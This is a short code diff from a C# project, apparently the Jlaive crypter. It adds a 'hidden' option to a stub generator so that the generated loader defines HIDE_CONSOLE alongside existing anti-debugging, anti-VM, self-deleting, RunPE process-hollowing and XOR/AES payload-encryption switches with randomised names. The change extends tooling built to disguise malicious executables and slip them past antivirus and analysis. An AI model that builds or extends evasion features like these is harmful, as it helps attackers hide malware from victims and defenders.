@@ -57,7 +57,7 @@ namespace Jlaive
             }
         }
 
-        public static string CreateCS(byte[] key, byte[] iv, EncryptionMode mode, bool antidebug, bool antivm, bool selfdelete, bool native, Random rng)
+        public static string CreateCS(byte[] key, byte[] iv, EncryptionMode mode, bool antidebug, bool antivm, bool selfdelete, bool hidden, bool native, Random rng)
         {
             string namespacename = RandomString(20, rng);
             string classname = RandomString(20, rng);
@@ -87,6 +87,7 @@ namespace Jlaive
             if (antidebug) stub += "#define ANTI_DEBUG\n";
             if (antivm) stub += "#define ANTI_VM\n";
             if (selfdelete) stub += "#define MELT_FILE\n";
+            if (hidden) stub += "#define HIDE_CONSOLE\n";
             if (native) stub += "#define USE_RUNPE\n";
             if (mode == EncryptionMode.XOR) stub += "#define XOR_ENCRYPT\n";
             else stub += "#define AES_ENCRYPT\n";
